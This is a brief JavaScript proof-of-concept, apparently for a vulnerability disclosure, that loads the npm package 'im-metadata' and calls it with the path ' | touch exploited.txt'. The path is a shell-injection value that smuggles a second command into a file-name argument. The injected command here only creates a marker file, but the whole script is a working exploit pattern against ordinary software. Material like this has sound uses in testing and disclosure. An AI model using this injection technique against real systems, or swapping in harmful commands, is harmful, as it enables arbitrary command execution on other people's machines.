const pkg = require('im-metadata');

const payload = " | touch exploited.txt";

console.log(pkg);

const path = payload;

const opts = {

};

const cb = function(error, data) {

};

pkg(path, opts, cb);